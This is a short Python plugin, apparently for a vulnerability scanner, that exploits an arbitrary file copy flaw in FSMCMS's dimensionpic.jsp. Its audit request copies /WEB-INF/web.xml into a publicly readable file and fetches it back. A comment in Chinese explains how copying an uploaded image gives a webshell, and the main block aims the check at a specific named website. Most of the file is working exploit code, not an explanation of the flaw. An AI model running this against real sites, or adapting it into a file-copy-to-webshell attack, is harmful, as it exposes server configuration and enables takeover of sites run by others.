#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 'FSMCMS dimensionpic.jsp Arbitrary File Creation'
#references = 'http://www.wooyun.org/bugs/wooyun-2015-0144332'
#dimensionpic.jsp复制文件功能设计不当，可复制站点文件到任意目录并重命名任意格式，该站点多处可上传图片，复制图片即可getshell


def assign(service, arg):
    if service == "fsmcms":
        return True, arg

def audit(arg):
    target = arg + "fsmcms/cms/web/dimensionpic.jsp?action=copy&SrcPicPath=/WEB-INF/web.xml&PicPath=/cms/web/test.txt"
    code, head,res, errcode, _   = curl.curl2(target)
    if code == 200 and '/cms/web/test.txt' in res:
            code1, head1,res1, errcode1, _1 = curl.curl2(arg+'/cms/web/test.txt')
            if code1 == 200 and 'FSM-CMS2' in res1:
                security_hole('shell:'+target)  

if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms', 'http://www.cnfia.cn/')[1])